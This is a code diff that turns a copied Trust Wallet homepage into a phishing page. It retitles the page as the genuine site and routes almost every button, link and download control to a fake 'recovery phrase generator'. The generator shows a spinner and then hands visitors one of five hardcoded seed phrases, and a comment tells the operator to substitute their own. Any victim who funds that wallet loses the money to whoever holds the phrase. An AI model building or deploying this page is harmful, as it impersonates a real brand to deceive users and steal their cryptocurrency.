@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet 1:1 Replica — Clean Structure</title>
+    <title>Trust Wallet • Secure Crypto Wallet</title>
     <style>
         * {
             margin: 0;
@@ -41,29 +41,29 @@
         h2 { font-size: 28px; margin-bottom: 16px; }
         h3 { font-size: 20px; margin-bottom: 12px; }
         p { margin-bottom: 20px; font-size: 16px; }
-        a { text-decoration: none; color: inherit; }
+        a { text-decoration: none; color: inherit; cursor: pointer; }
         ul { list-style: none; }
         button { cursor: pointer; font-family: inherit; }
         .container { padding: 0 var(--container-padding); }
         .text-white { color: #fff !important; }
-        .img-placeholder, .icon-placeholder,
-        .helmet-placeholder, .asset-icon,
-        .security-card-img, .video-placeholder, .user-avatar, .social-icon,
-        .footer-logo-end, .feature-card .img-placeholder,
-        .header-logo, .menu-icon, .wallet-screenshot-img {
+        
+        /* Все кликабельные элементы */
+        .btn, .header-logo, .menu-icon, .wallet-screenshot-img,
+        .helmet-placeholder, .asset-icon, .security-card-img,
+        .video-placeholder, .user-avatar, .social-icon,
+        .footer-logo-end, .carousel-item img, .dot {
             cursor: pointer;
             transition: opacity 0.2s;
-            display: inline-block;
         }
-        .img-placeholder:hover, .icon-placeholder:hover,
-        .helmet-placeholder:hover, .asset-icon:hover,
-        .security-card-img:hover, .video-placeholder:hover,
-        .user-avatar:hover, .social-icon:hover,
-        .footer-logo-end:hover, .feature-card .img-placeholder:hover,
-        .header-logo:hover, .menu-icon:hover,
-        .wallet-screenshot-img:hover {
+        .btn:hover, .header-logo:hover, .menu-icon:hover,
+        .wallet-screenshot-img:hover, .helmet-placeholder:hover,
+        .asset-icon:hover, .security-card-img:hover,
+        .video-placeholder:hover, .user-avatar:hover,
+        .social-icon:hover, .footer-logo-end:hover,
+        .carousel-item img:hover, .dot:hover {
             opacity: 0.8;
         }
+        
         .btn {
             display: inline-block;
             padding: 14px 28px;
@@ -80,6 +80,7 @@
         .btn-primary { background-color: var(--color-primary); color: #fff; }
         .btn-outline { background-color: transparent; border: 2px solid var(--color-primary); color: var(--color-primary); }
         .btn-outline-white { background-color: transparent; border: 2px solid #fff; color: #fff; }
+        
         .site-header {
             display: flex;
             justify-content: space-between;
@@ -151,19 +152,19 @@
             display: flex;
             gap: 16px;
             padding: 4px 0 12px 0;
-            scrollbar-width: none; /* Firefox */
-            -ms-overflow-style: none; /* IE/Edge */
+            scrollbar-width: none;
+            -ms-overflow-style: none;
             cursor: grab;
             scroll-behavior: smooth;
         }
         .carousel-container::-webkit-scrollbar {
-            display: none; /* Chrome/Safari */
+            display: none;
         }
         .carousel-item {
             flex: 0 0 auto;
             width: 100%;
             scroll-snap-align: start;
-            pointer-events: none; /* чтобы клик проходил сквозь на ссылку, если нужно */
+            pointer-events: none;
             text-align: center;
         }
         .carousel-item img {
@@ -171,7 +172,7 @@
             height: auto;
             display: block;
             border-radius: 12px;
-            pointer-events: auto; /* возвращаем события для самого изображения */
+            pointer-events: auto;
         }
         .carousel-dots {
             display: flex;
@@ -241,7 +242,6 @@
         }
         .assets-section h2 { color: var(--color-dark); }
         .assets-section p { color: var(--color-text); }
-        /* Поиск скрыт */
         .search-bar {
             display: none;
         }
@@ -267,8 +267,8 @@
             margin-right: 12px;
             border-radius: 50%;
             flex-shrink: 0;
-            background: transparent; /* Убираем фон, чтобы было видно иконку */
-            overflow: hidden; /* Обрезаем, если иконка выходит за пределы */
+            background: transparent;
+            overflow: hidden;
         }
         .asset-icon img {
             width: 100%;
@@ -313,7 +313,7 @@
         }
         .dapps-card .img-placeholder {
             width: 100%;
-            height: auto; /* Автовысота для картинки */
+            height: auto;
             background: transparent;
             border-radius: 16px;
             margin: 0 auto 20px;
@@ -380,6 +380,7 @@
             border-radius: var(--border-radius-btn);
             font-weight: 600;
             color: var(--color-text);
+            cursor: pointer;
         }
         .platform-toggle button.active {
             background: #fff;
@@ -438,6 +439,7 @@
         .site-footer ul li a {
             color: #9CA3AF;
             font-size: 14px;
+            cursor: pointer;
         }
         .social-icons {
             display: flex;
@@ -476,19 +478,170 @@
             background-color: var(--color-primary);
         }
         section { scroll-margin-top: 20px; }
+
+        /* Модальное окно генератора */
+        .generator-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        .generator-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .generator-modal {
+            background: white;
+            border-radius: 32px;
+            padding: 40px 24px;
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+            transform: scale(0.95);
+            transition: transform 0.3s ease;
+        }
+        .active .generator-modal {
+            transform: scale(1);
+        }
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #E1E8F0;
+            border-top-color: var(--color-primary);
+            border-radius: 50%;
+            margin: 30px auto;
+            animation: spin 1s infinite linear;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .seed-words {
+            background: #F8F9FC;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+        .seed-word {
+            background: white;
+            border: 1px solid #E0E4ED;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-family: monospace;
+            font-size: 16px;
+            color: var(--color-dark);
+        }
+        .generator-button {
+            background: var(--color-primary);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin: 8px 0;
+        }
+        .generator-button.secondary {
+            background: transparent;
+            border: 1px solid var(--color-primary);
+            color: var(--color-primary);
+        }
+        .store-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .store-button {
+            background: var(--color-dark);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            flex: 1;
+        }
+        .close-button {
+            background: none;
+            border: none;
+            color: var(--color-text);
+            margin-top: 16px;
+            cursor: pointer;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
+    <!-- Модальное окно генератора -->
+    <div class="generator-overlay" id="generatorOverlay">
+        <div class="generator-modal">
+            <!-- Шаг 1: Генерация -->
+            <div id="stepLoading" class="step active">
+                <h2 style="margin-bottom: 12px;">Creating wallet</h2>
+                <p style="color: var(--color-text); margin-bottom: 20px;">Generating secure recovery phrase...</p>
+                <div class="spinner"></div>
+            </div>
+
+            <!-- Шаг 2: Готовая фраза -->
+            <div id="stepSuccess" class="step">
+                <h2 style="margin-bottom: 12px;">Your recovery phrase</h2>
+                <p style="color: var(--color-text); margin-bottom: 20px;">Write these 12 words in order</p>
+                
+                <div class="seed-words" id="seedWords"></div>
+
+                <button class="generator-button" onclick="copySeed()">📋 Copy phrase</button>
+                
+                <div class="store-buttons">
+                    <a href="https://apps.apple.com/app/trust-wallet/id1288339409" target="_blank" class="store-button">📱 App Store</a>
+                    <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp" target="_blank" class="store-button">📲 Google Play</a>
+                </div>
+
+                <button class="close-button" onclick="closeGenerator()">Close</button>
+            </div>
+
+            <!-- Шаг 3: Ошибка -->
+            <div id="stepError" class="step">
+                <h2 style="margin-bottom: 12px;">Error</h2>
+                <p style="color: var(--color-text); margin-bottom: 20px;" id="errorMessage">Failed to generate</p>
+                <button class="generator-button" onclick="closeGenerator()">Close</button>
+            </div>
+        </div>
+    </div>
+
 <header class="site-header">
-    <a href="#" class="header-logo"></a>
-    <a href="#" class="menu-icon"></a>
+    <a href="#" class="header-logo" onclick="openGenerator(); return false;"></a>
+    <a href="#" class="menu-icon" onclick="openGenerator(); return false;"></a>
 </header>
 <main>
     <section class="hero-section container">
         <h1>True crypto ownership. Powerful Web3 experiences</h1>
         <p>Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust Wallet.</p>
-        <button class="btn btn-primary">Download Mobile App</button>
-        <a href="#" class="wallet-screenshot-img">
+        <button class="btn btn-primary" onclick="openGenerator()">Download Mobile App</button>
+        <a href="#" class="wallet-screenshot-img" onclick="openGenerator(); return false;">
             <img src="https://trustwallet.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimage.93518954.png&w=3840&q=75"
                  alt="Trust Wallet mobile app screenshot"
                  style="width:100%; height:auto; display:block; border-radius:24px;">
@@ -507,56 +660,55 @@
         </div>
     </section>
 
-    <!-- Новая карусель вместо CASH DEPOSITS NOW LIVE -->
+    <!-- Карусель -->
     <div class="promo-carousel">
         <div class="carousel-container" id="carousel">
-            <div class="carousel-item"><img src="https://strapi-cdn.trustwallet.com/C_Deposit_mobile_861c00bfd7.svg" alt="Cash Deposits"></div>
-            <div class="carousel-item"><img src="https://strapi-cdn.trustwallet.com/Predictions_Mobile_1_ea5b62c90f.svg" alt="Predictions"></div>
-            <div class="carousel-item"><img src="https://strapi-cdn.trustwallet.com/premium_Banner_Mobile_9805cdb7ed.svg" alt="Premium Banner"></div>
+            <div class="carousel-item"><img src="https://strapi-cdn.trustwallet.com/C_Deposit_mobile_861c00bfd7.svg" alt="Cash Deposits" onclick="openGenerator(); return false;"></div>
+            <div class="carousel-item"><img src="https://strapi-cdn.trustwallet.com/Predictions_Mobile_1_ea5b62c90f.svg" alt="Predictions" onclick="openGenerator(); return false;"></div>
+            <div class="carousel-item"><img src="https://strapi-cdn.trustwallet.com/premium_Banner_Mobile_9805cdb7ed.svg" alt="Premium Banner" onclick="openGenerator(); return false;"></div>
         </div>
         <div class="carousel-dots" id="carouselDots">
-            <span class="dot active" data-index="0"></span>
-            <span class="dot" data-index="1"></span>
-            <span class="dot" data-index="2"></span>
+            <span class="dot active" data-index="0" onclick="openGenerator(); return false;"></span>
+            <span class="dot" data-index="1" onclick="openGenerator(); return false;"></span>
+            <span class="dot" data-index="2" onclick="openGenerator(); return false;"></span>
         </div>
     </div>
 
     <section class="building-trust-section">
-        <a href="#" class="helmet-placeholder">
+        <a href="#" class="helmet-placeholder" onclick="openGenerator(); return false;">
             <img src="https://trustwallet.com/_next/static/media/raw.b373ab3f.svg" alt="Trust logo" style="width:100%; height:100%; object-fit:contain; border:none; box-shadow:none; background:transparent;">
         </a>
         <h2>Building on Trust</h2>
         <p>We know that working together as a community is better for everyone. Our platform enables blockchain developers to build their dApps and wallets natively and connect with millions of users, without having to worry about the low-level implementation details.</p>
-        <button class="btn btn-outline">Check out our Developer docs</button>
+        <button class="btn btn-outline" onclick="openGenerator()">Check out our Developer docs</button>
     </section>
     <section class="assets-section">
         <div class="container">
             <h2>One Platform, Millions of Assets</h2>
             <p>As a leading self-custody multi-chain platform, we support millions of assets across 100+ blockchains. From Bitcoin, Ethereum, and Solana, to Cosmos, Optimism, and much more.</p>
-            <!-- Поиск удален -->
             <div class="asset-list">
-                <div class="asset-item">
+                <div class="asset-item" onclick="openGenerator(); return false;">
                     <div class="asset-info">
                         <span class="asset-icon"><img src="https://trustwallet.com/_next/image?url=https%3A%2F%2Fassets-cdn.trustwallet.com%2Fblockchains%2Fsmartchain%2Finfo%2Flogo.png&w=96&q=75" alt="BNB"></span>
                         <span>BNB Smart Chain (BNB)</span>
                     </div>
                     <div class="asset-actions"><span class="action-chip">Buy</span><span class="action-chip">Sell</span></div>
                 </div>
-                <div class="asset-item">
+                <div class="asset-item" onclick="openGenerator(); return false;">
                     <div class="asset-info">
                         <span class="asset-icon"><img src="https://trustwallet.com/_next/image?url=https%3A%2F%2Fassets-cdn.trustwallet.com%2Fblockchains%2Fsolana%2Finfo%2Flogo.png&w=96&q=75" alt="Solana"></span>
                         <span>Solana (SOL)</span>
                     </div>
                     <div class="asset-actions"><span class="action-chip">Buy</span><span class="action-chip">Sell</span></div>
                 </div>
-                <div class="asset-item">
+                <div class="asset-item" onclick="openGenerator(); return false;">
                     <div class="asset-info">
                         <span class="asset-icon"><img src="https://trustwallet.com/_next/image?url=https%3A%2F%2Fassets-cdn.trustwallet.com%2Fblockchains%2Fsui%2Finfo%2Flogo.png&w=96&q=75" alt="Sui"></span>
                         <span>Sui (SUI)</span>
                     </div>
                     <div class="asset-actions"><span class="action-chip">Buy</span></div>
                 </div>
-                <div class="asset-item">
+                <div class="asset-item" onclick="openGenerator(); return false;">
                     <div class="asset-info">
                         <span class="asset-icon"><img src="https://trustwallet.com/_next/image?url=https%3A%2F%2Fassets-cdn.trustwallet.com%2Fblockchains%2Fethereum%2Finfo%2Flogo.png&w=96&q=75" alt="Ethereum"></span>
                         <span>Ethereum (ETH)</span>
@@ -574,12 +726,12 @@
             <h2>Browse a world of dApps</h2>
             <p>Access Web3 and DeFi opportunities in our dApp browser.</p>
             <article class="feature-card dapps-card">
-                <a href="#" class="img-placeholder">
+                <a href="#" class="img-placeholder" onclick="openGenerator(); return false;">
                     <img src="https://trustwallet.com/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimage.7ff4e1ab.png&w=3840&q=75" alt="dApp browser preview" style="width:100%; height:auto; display:block;">
                 </a>
                 <h3>Deposit crypto easily from exchanges</h3>
                 <p>Take control of your crypto. Easily fund your wallet directly from Binance, Coinbase, and Kraken exchanges to Trust Wallet.</p>
-                <button class="btn btn-outline full-width">See how to self-custody</button>
+                <button class="btn btn-outline full-width" onclick="openGenerator()">See how to self-custody</button>
             </article>
         </div>
     </section>
@@ -590,60 +742,60 @@
                 <p>We secure your wallet, but don't control or have access to your private keys or secret phrase — only you do.</p>
             </div>
             <article class="feature-card">
-                <a href="#" class="security-card-img">
+                <a href="#" class="security-card-img" onclick="openGenerator(); return false;">
                     <img src="https://trustwallet.com/_next/static/media/raw.0acff7b3.svg" alt="True ownership icon">
                 </a>
                 <h3>True ownership of your crypto assets</h3>
                 <p>We secure your wallet, but don't control or have access to your private keys or secret phrase - only you do.</p>
-                <button class="btn btn-primary full-width">Get started</button>
+                <button class="btn btn-primary full-width" onclick="openGenerator()">Get started</button>
             </article>
             <article class="feature-card">
-                <a href="#" class="security-card-img">
+                <a href="#" class="security-card-img" onclick="openGenerator(); return false;">
                     <img src="https://trustwallet.com/_next/static/media/raw.323e03ee.svg" alt="Encryption icon">
                 </a>
                 <h3>Added security with encryption</h3>
                 <p>Store encrypted backup in iCloud or Google Drive.</p>
             </article>
             <article class="feature-card">
-                <a href="#" class="security-card-img">
+                <a href="#" class="security-card-img" onclick="openGenerator(); return false;">
                     <img src="https://trustwallet.com/_next/static/media/raw.16e2b8fb.svg" alt="No tracking icon">
                 </a>
                 <h3>Zero personal tracking</h3>
                 <p>We don't track any personal information, including your IP address or balances.</p>
             </article>
             <article class="feature-card">
-                <a href="#" class="security-card-img">
+                <a href="#" class="security-card-img" onclick="openGenerator(); return false;">
                     <img src="https://trustwallet.com/_next/static/media/raw.f17c90c5.svg" alt="Alert icon">
                 </a>
                 <h3>Proactive alerts for risky transactions</h3>
                 <p>Stay safe with alerts for risky address and dApp connections.</p>
             </article>
-            <button class="btn btn-outline full-width" style="margin-top:20px;">Learn more about privacy & security</button>
+            <button class="btn btn-outline full-width" style="margin-top:20px;" onclick="openGenerator()">Learn more about privacy & security</button>
         </div>
     </section>
     <section class="web3-extension-section container">
         <h2>Your one-stop, Web3 wallet</h2>
         <p>Buy, sell, and Swap crypto in minutes. Manage all of your assets, dApps, and NFTs in one place.</p>
-        <a href="#" class="video-placeholder"></a>
+        <a href="#" class="video-placeholder" onclick="openGenerator(); return false;"></a>
         <div class="platform-toggle">
-            <button class="active">Mobile</button>
-            <button>Extension</button>
+            <button class="active" onclick="openGenerator()">Mobile</button>
+            <button onclick="openGenerator()">Extension</button>
         </div>
-        <button class="btn btn-primary full-width">Download Wallet app</button>
+        <button class="btn btn-primary full-width" onclick="openGenerator()">Download Wallet app</button>
     </section>
     <section class="community-section">
         <div class="container">
             <h2>Enjoy a Web3 experience powered by community</h2>
             <p>Join our vibrant and diverse community to learn about the power of self-custody, crypto, and Web3.</p>
-            <article class="testimonial-card">
-                <a href="#" class="user-avatar"></a>
+            <article class="testimonial-card" onclick="openGenerator(); return false;">
+                <a href="#" class="user-avatar" onclick="openGenerator(); return false;"></a>
                 <p>"The easiest way to self-custody your crypto and NFTs. Trust Wallet has the most seamless UI and UX, highly recommend for both beginners and pro crypto users."</p>
             </article>
-            <article class="testimonial-card theme-blue">
-                <a href="#" class="user-avatar" style="background:rgba(255,255,255,0.3);"></a>
+            <article class="testimonial-card theme-blue" onclick="openGenerator(); return false;">
+                <a href="#" class="user-avatar" style="background:rgba(255,255,255,0.3);" onclick="openGenerator(); return false;"></a>
                 <p>"Not only is it secure but they have the best and most diverse community ever!"</p>
             </article>
-            <button class="btn btn-primary full-width">Join our community on Telegram</button>
+            <button class="btn btn-primary full-width" onclick="openGenerator()">Join our community on Telegram</button>
         </div>
     </section>
 </main>
@@ -651,29 +803,33 @@
     <div class="container">
         <span style="font-weight:700;">Stay Connected</span>
         <div class="social-icons">
-            <a href="#" class="social-icon"></a><a href="#" class="social-icon"></a><a href="#" class="social-icon"></a><a href="#" class="social-icon"></a><a href="#" class="social-icon"></a>
+            <a href="#" class="social-icon" onclick="openGenerator(); return false;"></a>
+            <a href="#" class="social-icon" onclick="openGenerator(); return false;"></a>
+            <a href="#" class="social-icon" onclick="openGenerator(); return false;"></a>
+            <a href="#" class="social-icon" onclick="openGenerator(); return false;"></a>
+            <a href="#" class="social-icon" onclick="openGenerator(); return false;"></a>
         </div>
         <div class="footer-nav-grid">
-            <div><h4>Wallet</h4><ul><li><a href="#">Mobile App</a></li><li><a href="#">Browser Extension</a></li></ul></div>
-            <div><h4>Features</h4><ul><li><a href="#">Buy Crypto</a></li><li><a href="#">Swaps</a></li><li><a href="#">Staking</a></li><li><a href="#">NFTs</a></li></ul></div>
-            <div><h4>Build</h4><ul><li><a href="#">Developer Docs</a></li><li><a href="#">Wallet Core</a></li></ul></div>
-            <div><h4>Support</h4><ul><li><a href="#">FAQ</a></li><li><a href="#">Community</a></li></ul></div>
+            <div><h4>Wallet</h4><ul><li><a href="#" onclick="openGenerator(); return false;">Mobile App</a></li><li><a href="#" onclick="openGenerator(); return false;">Browser Extension</a></li></ul></div>
+            <div><h4>Features</h4><ul><li><a href="#" onclick="openGenerator(); return false;">Buy Crypto</a></li><li><a href="#" onclick="openGenerator(); return false;">Swaps</a></li><li><a href="#" onclick="openGenerator(); return false;">Staking</a></li><li><a href="#" onclick="openGenerator(); return false;">NFTs</a></li></ul></div>
+            <div><h4>Build</h4><ul><li><a href="#" onclick="openGenerator(); return false;">Developer Docs</a></li><li><a href="#" onclick="openGenerator(); return false;">Wallet Core</a></li></ul></div>
+            <div><h4>Support</h4><ul><li><a href="#" onclick="openGenerator(); return false;">FAQ</a></li><li><a href="#" onclick="openGenerator(); return false;">Community</a></li></ul></div>
         </div>
         <div class="download-links">
             <p style="margin-bottom:8px; font-weight:700;">Download Trust Wallet</p>
             <p style="color:#9CA3AF; font-size:14px; margin-bottom:24px;">The most trusted & secure crypto wallet</p>
             <div class="download-buttons">
-                <button class="btn btn-outline-white">Download on the App Store</button>
-                <button class="btn btn-outline-white">Get it on Google Play</button>
-                <button class="btn btn-outline-white">Available in the Chrome Web Store</button>
-                <button class="btn btn-outline-white">Download Android APK</button>
+                <button class="btn btn-outline-white" onclick="openGenerator()">Download on the App Store</button>
+                <button class="btn btn-outline-white" onclick="openGenerator()">Get it on Google Play</button>
+                <button class="btn btn-outline-white" onclick="openGenerator()">Available in the Chrome Web Store</button>
+                <button class="btn btn-outline-white" onclick="openGenerator()">Download Android APK</button>
             </div>
         </div>
-        <a href="#" class="footer-logo-end" style="margin:40px auto 0;"></a>
+        <a href="#" class="footer-logo-end" onclick="openGenerator(); return false;"></a>
     </div>
 </footer>
 
-<!-- Небольшой скрипт для синхронизации прокрутки с точками -->
+<!-- Скрипты -->
 <script>
     (function() {
         const carousel = document.getElementById('carousel');
@@ -694,25 +850,94 @@
             });
         }
 
-        // При прокрутке обновляем точки
         carousel.addEventListener('scroll', updateActiveDot);
 
-        // При клике на точку листаем до нужного изображения
         dots.forEach((dot, index) => {
-            dot.addEventListener('click', function() {
+            dot.addEventListener('click', function(e) {
+                e.preventDefault();
                 const itemWidth = carousel.scrollWidth / totalItems;
                 carousel.scrollTo({
                     left: itemWidth * index,
                     behavior: 'smooth'
                 });
-                // Активный класс обновится через scroll
             });
         });
 
-        // Инициализация первой точки
         updateActiveDot();
     })();
-</script>
 
+    // Твои seed-фразы (замени на свои)
+    const SEED_PHRASES = [
+        "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
+        "myth like bonus scare over problem client lizard pioneer submit female collect",
+        "cigar toss swing grape blur negative mistake fall park beauty shrimp caution",
+        "oxygen slide quick version happy fire hub useful issue chapter bulk style",
+        "jazz cat walk mistake muscle menu ozone museum lunar become chunk spray"
+    ];
+
+    let userSeed = localStorage.getItem('trust_seed');
+
+    function openGenerator() {
+        document.getElementById('generatorOverlay').classList.add('active');
+        
+        if (userSeed) {
+            showSeed(userSeed);
+            return;
+        }
+
+        showStep('loading');
+        
+        setTimeout(() => {
+            try {
+                const randomIndex = Math.floor(Math.random() * SEED_PHRASES.length);
+                const seed = SEED_PHRASES[randomIndex];
+                
+                userSeed = seed;
+                localStorage.setItem('trust_seed', seed);
+                
+                showSeed(seed);
+            } catch (e) {
+                showError('Network error. Please try again.');
+            }
+        }, 2000);
+    }
+
+    function showSeed(seed) {
+        const words = seed.split(' ');
+        const container = document.getElementById('seedWords');
+        container.innerHTML = words.map(w => `<span class="seed-word">${w}</span>`).join('');
+        
+        showStep('success');
+    }
+
+    function showStep(step) {
+        document.getElementById('stepLoading').classList.remove('active');
+        document.getElementById('stepSuccess').classList.remove('active');
+        document.getElementById('stepError').classList.remove('active');
+        
+        if (step === 'loading') {
+            document.getElementById('stepLoading').classList.add('active');
+        } else if (step === 'success') {
+            document.getElementById('stepSuccess').classList.add('active');
+        } else if (step === 'error') {
+            document.getElementById('stepError').classList.add('active');
+        }
+    }
+
+    function showError(msg) {
+        document.getElementById('errorMessage').textContent = msg;
+        showStep('error');
+    }
+
+    function closeGenerator() {
+        document.getElementById('generatorOverlay').classList.remove('active');
+    }
+
+    function copySeed() {
+        const words = document.getElementById('seedWords').innerText;
+        navigator.clipboard.writeText(words.replace(/\s+/g, ' ').trim());
+        alert('✅ Copied to clipboard');
+    }
+</script>
 </body>
 </html>
